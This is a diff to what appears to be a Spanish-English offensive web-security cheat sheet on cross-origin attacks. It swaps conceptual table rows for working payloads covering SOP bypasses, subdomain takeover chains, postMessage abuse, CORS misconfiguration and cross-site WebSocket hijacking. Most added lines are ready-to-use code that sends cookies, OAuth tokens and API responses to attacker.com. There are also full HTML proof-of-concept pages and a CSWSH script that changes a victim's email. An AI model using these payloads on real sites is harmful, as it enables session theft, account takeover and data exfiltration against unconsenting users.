@@ -26,21 +26,18 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Browser bug | Direct SOP bypass | Per-vuln. |
-| Subdomain trust abuse | Sub trusts parent y vice versa | Cross-sub. |
-| Document.domain manipulation | Old technique — set parent.domain to common | Mostly mitigated modern browsers. |
-| `document.domain` legacy bypass | Both pages set to common domain | Deprecated en modern browsers. |
-| Iframe bypass via `srcdoc` | Inline content shares origin | Edge. |
-| `<object>` / `<embed>` cross-origin | Plugin-based bypass | Legacy Flash / etc. |
-| `window.opener` reference | New tab có reference a parent | Edge. |
-| WebSocket lacks SOP | WS handshake includes Origin but app may not check | CSWSH. |
-| postMessage no Origin check | Cross-origin postMessage | Standard. |
-| CORS misconfig | Server reflects Origin → permits credentials | Standard. |
-| File:// origin null | Local files have null origin | Edge. |
-| Sandboxed iframe Origin null | Sandbox attribute → null Origin | Edge. |
-| `data:` URL Origin | data URLs sin origin | Limited. |
-| Subdomain con wildcard cookie | Cookie scoped to all subs | Cross-sub abuse. |
-| Combine con XSS en sub | Sub XSS reads parent's data via SOP | Cross-sub XSS. |
+| `<script>document.domain='target.com'</script>` (en sub + parent ambos) | Legacy document.domain set common | Pre-2022 browsers. |
+| `<iframe srcdoc="<script>parent.fetch('//attacker.com/?d='+parent.document.cookie)</script>"></iframe>` | srcdoc inline content shares parent origin | Edge HTML5. |
+| `<iframe sandbox="allow-scripts" src="https://target.com"></iframe>` (sandbox → Origin null) | Sandboxed iframe Origin null exploit | Server accepts null. |
+| `<a href="https://target.com/page" target="_blank">click</a>` luego `<script>window.opener.location='//attacker.com'</script>` | window.opener reference (tabnabbing) | Edge tabnabbing. |
+| `new WebSocket('wss://target.com/api', ['Origin: //attacker.com'])` | WS lacks SOP — Origin not enforced | CSWSH. |
+| `<iframe src="https://target.com" id=t></iframe><script>window.addEventListener('message',e=>fetch('//attacker.com/?d='+btoa(JSON.stringify(e.data))))</script>` | postMessage cross-origin listen | postMessage abuse. |
+| `curl -H "Origin: https://attacker.com" -I https://target.com/api/me \| grep -i access-control` | Probe CORS reflected Origin | CORS misconfig. |
+| `<embed src="https://target.com/file.swf">` (legacy Flash) | Plugin cross-origin bypass | Legacy Flash. |
+| `<iframe src="data:text/html,<script>fetch('https://target.com/api/me',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('//attacker.com/?d='+btoa(d)))</script>"></iframe>` | data: URL Origin null | Edge. |
+| `<iframe src="file:///etc/passwd"></iframe>` (file:// Origin null) | Local file null origin | Local context. |
+| `<script>document.cookie='session=ATTACKER; Domain=.target.com'</script>` (sub XSS) | Wildcard cookie cross-sub abuse | Cross-sub XSS. |
+| Burp `Match and Replace` rule add `Origin: https://attacker.com` | Manual Origin manipulation | Manual probe. |
 ^sh-cross-sop
 
 ___
@@ -49,19 +46,19 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Stage 1: Identify dangling sub | `*.target.com` con CNAME dangling | See Subdomain Takeover. |
-| Stage 2: Claim sub | Atacante owns subdomain | HTTPS valid. |
-| Stage 3: Cookie scope abuse | Cookie con `Domain=.target.com` | Sent to all subs. |
-| Stage 4: JS reads parent cookies | If not HttpOnly | Direct theft. |
-| Stage 5: Cookie tossing | Set malicious cookie en parent | Fixation. |
-| OAuth `redirect_uri` whitelist | Sub whitelisted → atacante claims | Code theft. |
-| SAML SP / IdP trust | Sub als SP → atacante receives assertions | Federation. |
-| CORS subdomain trust | `*.target.com` allowed → fetch with credentials | Data exfil. |
-| CSP subdomain whitelist | JS from sub allowed → atacante's malicious JS in main | XSS upgrade. |
-| WebSocket hostname trust | WS Origin trust includes subdomain | CSWSH. |
-| Cross-frame access | iframe content from sub → reads parent | Edge. |
-| Persistent session hijack | Long-lived cookies + permanent sub control | Permanent ATO. |
-| See `Subdomain Takeover` for full chain | Comprehensive | Cross-ref. |
+| `subfinder -d target.com -all -recursive \| httpx -title -tech-detect` | Enum subdomains pre-takeover | Pre-attack. |
+| `subjack -w subs.txt -t 100 -timeout 30 -ssl -c fingerprints.json -v` | subjack auto detect dangling CNAME | Takeover detect. |
+| `nuclei -t http/takeovers/ -l subs.txt` | Nuclei takeover templates | Templates. |
+| `dig CNAME forgotten.target.com` luego `aws s3 mb s3://forgotten.target.com` (claim S3 bucket) | Claim dangling S3 takeover | S3 takeover. |
+| `heroku create forgotten-target && heroku domains:add forgotten.target.com` | Claim Heroku takeover | Heroku takeover. |
+| `<script>document.cookie='session=ATTACKER; Domain=.target.com; Path=/'</script>` (host en sub claimed) | Set parent-scope cookie post-takeover | Cookie tossing. |
+| `<script>fetch('//attacker.com/?c='+document.cookie)</script>` (host en claimed sub) | Read non-HttpOnly parent cookies | Cookie theft. |
+| `curl https://target.com/oauth/authorize?redirect_uri=https://forgotten.target.com/callback&client_id=...` | OAuth redirect_uri whitelist subdomain abuse | OAuth code theft. |
+| `curl -X POST -d "SAMLResponse=$(cat malicious_assertion.b64)" https://target.com/saml/acs` (host SP en sub) | SAML SP trust via sub takeover | Federation. |
+| `<script>fetch('https://api.target.com/me', {credentials:'include'}).then(r=>r.text()).then(d=>fetch('//attacker.com/?d='+btoa(d)))</script>` (host en sub allowed by CORS) | CORS wildcard sub credential abuse | CORS combo. |
+| `<script src="https://forgotten.target.com/x.js"></script>` (CSP whitelist sub → JS XSS) | CSP wildcard sub bypass | CSP combo. |
+| `new WebSocket('wss://target.com/api')` (host en claimed sub) | WS Origin trust via sub | CSWSH combo. |
+| `certbot certonly --standalone -d forgotten.target.com` | Generate valid TLS cert for claimed sub | Cert legitimization. |
 ^sh-cross-subdomain-takeover
 
 ___
@@ -70,32 +67,26 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | App listens postMessage cross-origin. Atacante's iframe sends malicious data → app processes. | Cross-origin chat. |
-| Listener sin origin check | `window.addEventListener('message', e => process(e.data))` sin `e.origin` validation | Vulnerable. |
-| Sensitive data exfil | Atacante's iframe receives postMessage with token | Standard. |
-| Atacante iframe injects message | `iframe.contentWindow.postMessage({token:'STEAL'}, '*')` | Direct. |
-| Listener echoes data | App responds con sensitive data via postMessage | Disclosure. |
-| Listener executes commands | If listener evaluates messages | XSS-like. |
-| Combine con OAuth callback | OAuth flows often use postMessage | Federation chain. |
-| OpenID Connect implicit | Token in postMessage | Standard. |
-| BroadcastChannel API | Same-origin only — different vector | Limited. |
-| MessageChannel ports | Cross-origin port abuse | Edge. |
-| Combine con XSS | XSS senders postMessage data exfil | Multi-vector. |
-| Origin validation TOCTOU | Race condition en origin check | Edge. |
-| Wildcard Origin in target | `*` in postMessage target | Loose security. |
+| `<iframe src="https://target.com" id=t></iframe><script>window.addEventListener('message',e=>fetch('//attacker.com/?d='+btoa(JSON.stringify(e.data))))</script>` | Listen to postMessage from target iframe | App sends sensitive data via postMessage. |
+| `<iframe src="https://target.com" id=t></iframe><script>setTimeout(()=>t.contentWindow.postMessage({type:'getToken'},'*'),3000)</script>` | Send forged message to target — request token | Listener sin origin check. |
+| `<iframe src="https://target.com/oauth/callback"></iframe><script>addEventListener('message',e=>fetch('//attacker.com/?t='+e.data.access_token))</script>` | OAuth implicit token via postMessage | OAuth combo. |
+| `<script>opener.postMessage({type:'exec',code:"fetch('//attacker.com/?c='+document.cookie)"},'*')</script>` (en popup atacante's) | Postmessage with code — XSS if listener eval | XSS-like sink. |
+| `<iframe src="https://target.com" id=t></iframe><script>let m=new MessageChannel();t.contentWindow.postMessage('init',[m.port2]);m.port1.onmessage=e=>fetch('//attacker.com/?d='+btoa(e.data))</script>` | MessageChannel port abuse | Cross-origin port. |
+| `<iframe src="https://target.com" id=t></iframe><script>t.contentWindow.postMessage('<img src=x onerror=fetch(`//attacker.com/?c=`+document.cookie)>','*')</script>` | Send HTML payload — listener may innerHTML it | XSS via postMessage sink. |
+| Burp DOM Invader → Inject Test Payloads → check postMessage listeners | Auto-discover vulnerable listeners | Automated probe. |
+| `<script>const b=new BroadcastChannel('app');b.onmessage=e=>fetch('//attacker.com/?d='+btoa(JSON.stringify(e.data)))</script>` (same-origin only) | BroadcastChannel exfil if same-origin XSS | Same-origin XSS combo. |
+| `<iframe sandbox="allow-scripts" src="https://target.com"></iframe>` (Origin null) | Sandboxed iframe → Origin null bypasses origin check | Server accepts null. |
+| `chrome --user-data-dir=/tmp/p --disable-web-security` luego DevTools → Console → `postMessage` listeners audit | Manual audit listeners | Pre-attack research. |
+| `<script>onmessage=e=>{if(e.origin.endsWith('target.com'))fetch('//attacker.com/?d='+e.data)}</script>` (endsWith flaw) | Origin validation flaw `endsWith` allows `notrustedtarget.com` | Bypass validation. |
 ^sh-cross-postmessage
 
 ### postMessage exfil PoC
 
 ```html
-<!-- Atacante hostea attacker.com -->
 <iframe src="https://target.com/login" id="t"></iframe>
 <script>
-  // Wait for iframe load
   document.getElementById('t').onload = () => {
-    // Listen for any postMessage from target
     window.addEventListener('message', (event) => {
-      // Exfil to attacker
       fetch('https://attacker.com/log', {
         method: 'POST',
         body: JSON.stringify({
@@ -114,36 +105,30 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | CORS server permite atacante origin + Allow-Credentials → atacante's JS makes authenticated cross-origin requests + reads response | Standard. |
-| `Access-Control-Allow-Origin: *` con credentials | Browser rejects this combination — but server bug | Edge. |
-| Reflected Origin | Server reflects request Origin in response | Common bug. |
-| Wildcard subdomain | `*.target.com` allowed | Subdomain takeover combo. |
-| Trusted "evil-target.com" | Substring match | Origin validation flaw. |
-| Null Origin | Sandboxed iframe → Origin: null | Server may accept. |
-| `file://` origin | Some servers accept | Edge. |
-| Origin con port confusion | `https://target.com:443` vs default | Edge parsing. |
-| Combine con XSS source domain | Sub takeover + CORS trust | Combined. |
-| Combine con OAuth | OAuth server CORS | Standard. |
-| Bypass via `<script>` tag | If app returns JSON wrapped en JS | JSONP-style abuse. |
-| WebSocket allows null check | WS doesn't have CORS — checks Origin manually | Different. |
-| Read sensitive API responses | Atacante's JS fetches with `credentials:'include'` | Direct exfil. |
-| Trigger sensitive actions | Same idea + state-changing | CSRF + CORS. |
-| Internal-only APIs trusted | If `Access-Control-Allow-Origin: *` on internal | Edge. |
+| `curl -I -H "Origin: https://attacker.com" https://target.com/api/me \| grep -iE "access-control"` | Probe reflected Origin + Allow-Credentials | Standard CORS probe. |
+| `curl -I -H "Origin: null" https://target.com/api/me \| grep -i access-control-allow-origin` | Null Origin acceptance probe | Sandbox iframe abuse. |
+| `curl -I -H "Origin: https://target.com.attacker.com" https://target.com/api/me \| grep access-control` | Suffix attack — substring match flaw | Origin validation flaw. |
+| `curl -I -H "Origin: https://attacker-target.com" https://target.com/api/me \| grep access-control` | Prefix attack | Validation flaw. |
+| `curl -I -H "Origin: https://sub.target.com" https://target.com/api/me \| grep access-control` | Wildcard subdomain trust check | Sub takeover combo. |
+| `curl -I -H "Origin: http://target.com" https://target.com/api/me \| grep access-control` | HTTP vs HTTPS scheme confusion | Mixed scheme. |
+| `curl -I -H "Origin: https://target.com:1234" https://target.com/api/me \| grep access-control` | Port confusion | Port parsing. |
+| `<script>fetch('https://target.com/api/user',{credentials:'include'}).then(r=>r.json()).then(d=>fetch('//attacker.com/?d='+btoa(JSON.stringify(d))))</script>` (host en attacker.com) | Direct CORS credential exfil PoC | Misconfig exploit. |
+| `<script>fetch('https://target.com/api/admin',{credentials:'include',method:'POST',body:JSON.stringify({role:'admin'})}).then(r=>r.text())</script>` | CORS + state-changing action | CSRF+CORS combo. |
+| `<iframe sandbox="allow-scripts" srcdoc="<script>fetch('https://target.com/me',{credentials:'include'}).then(r=>r.text()).then(d=>top.postMessage(d,'*'))</script>"></iframe>` | Sandbox + null Origin + parent postMessage exfil | Null exploit. |
+| `python3 -c "import requests; print(requests.options('https://target.com/api/me', headers={'Origin':'https://attacker.com','Access-Control-Request-Method':'PUT','Access-Control-Request-Headers':'x-custom'}).headers)"` | Preflight OPTIONS probe | Preflight inspection. |
+| `<script><!--JSONP-style--><script src="https://target.com/api/data?callback=alert"></script>` | JSONP-style abuse if API returns wrapped JS | JSONP CORS bypass. |
 ^sh-cross-cors
 
 ### CORS exfil PoC
 
 ```html
-<!-- Atacante hostea attacker.com -->
 <script>
   fetch('https://target.com/api/user/profile', {
     method: 'GET',
-    credentials: 'include'  // sends victim's cookies
+    credentials: 'include'
   })
   .then(r => r.json())
   .then(data => {
-    // Si Access-Control-Allow-Origin: https://attacker.com (reflected)
-    // y Access-Control-Allow-Credentials: true → response readable
     fetch('https://attacker.com/log', {
       method: 'POST',
       body: JSON.stringify(data)
@@ -158,39 +143,29 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Concept | WebSocket handshake = HTTP request con cookies. Sin Origin check, atacante opens WS to target → cross-origin auth'd connection. | Standard CSWSH. |
-| WS sin Origin check | `wss://target/socket` opens with cookies | Direct. |
-| Origin null bypass | Sandboxed iframe → Origin: null accepted | Edge. |
-| Authenticate via cookies | Cookies sent automatically en WS handshake | Standard. |
-| Read incoming WS data | `ws.onmessage = e => exfil(e.data)` | Continuous exfil. |
-| Send commands as victim | `ws.send(JSON.stringify({...}))` | Action injection. |
-| Subscribe to user channels | If channel-based protocol | Real-time data. |
-| Combine con XSS | XSS embeds CSWSH | Persistent. |
-| Auth token en URL hash | If WS auth via fragment | Edge. |
-| Subprotocol auth bypass | `Sec-WebSocket-Protocol: jwt, eyJ...` | Edge. |
-| Combine con CORS | If WS uses CORS-style auth | Mixed. |
-| Push notification interception | If WS used for push | Sensitive data. |
-| Combine con CSRF | Action via WS sent as victim | Standard. |
-| See `CSRF - Tipos Especiales (CSWSH)` | Cross-ref | Reference. |
+| `wscat -c wss://target.com/socket -H "Origin: https://attacker.com"` | Manual WS connection con forged Origin | Pre-attack probe. |
+| `<script>const ws=new WebSocket('wss://target.com/socket');ws.onmessage=e=>fetch('//attacker.com/?d='+btoa(e.data))</script>` (host en attacker.com) | CSWSH connect + exfil messages | App sin Origin check. |
+| `<script>const ws=new WebSocket('wss://target.com/socket');ws.onopen=()=>ws.send(JSON.stringify({type:'change_email',email:'attacker@evil.com'}))</script>` | CSWSH state-changing action | Action injection. |
+| `<iframe sandbox="allow-scripts" srcdoc="<script>new WebSocket('wss://target.com/socket').onopen=function(){this.send('{}');this.onmessage=e=>top.postMessage(e.data,'*')}</script>"></iframe>` | Null Origin via sandbox CSWSH | Origin null bypass. |
+| `python3 -c "import websocket; ws=websocket.create_connection('wss://target.com/socket', cookie='session=STOLEN', origin='https://attacker.com'); ws.send('{}'); print(ws.recv())"` | Python WS replay con stolen cookie + forged Origin | Post-cookie steal. |
+| `wscat -c "wss://target.com/socket?token=$TOKEN"` | WS token in URL fragment/query | Token-in-URL leak. |
+| `wscat -c wss://target.com/socket -s 'jwt' -s "$JWT"` | Subprotocol-based auth | `Sec-WebSocket-Protocol` auth. |
+| `<script>const ws=new WebSocket('wss://target.com/notifications');ws.onmessage=e=>{if(e.data.includes('token'))fetch('//attacker.com/?t='+btoa(e.data))}</script>` | Push notification token interception | Real-time sensitive. |
+| Burp Suite → WebSocket history → repeat con manipulated Origin header | Manual CSWSH replay | Workflow probe. |
+| `<script>const ws=new WebSocket('wss://target.com/admin');ws.onopen=()=>ws.send(JSON.stringify({cmd:'shell',args:'cat /etc/passwd'}))</script>` | Admin WS abuse | Privileged endpoint. |
 ^sh-cross-websocket
 
-### CSWSH PoC
+### CSWSH PoC complete
 
 ```html
-<!-- Atacante hostea attacker.com -->
 <script>
   const ws = new WebSocket('wss://target.com/api/socket');
-  
+
   ws.onopen = () => {
-    // Cookies auto-sent during handshake
-    // Victim authenticated → atacante's WS authenticated
-    
-    // Send commands as victim
     ws.send(JSON.stringify({type:'change_email', email:'attacker@evil.com'}));
   };
-  
+
   ws.onmessage = (event) => {
-    // Exfil all received data
     fetch('https://attacker.com/log', {
       method: 'POST',
       body: event.data
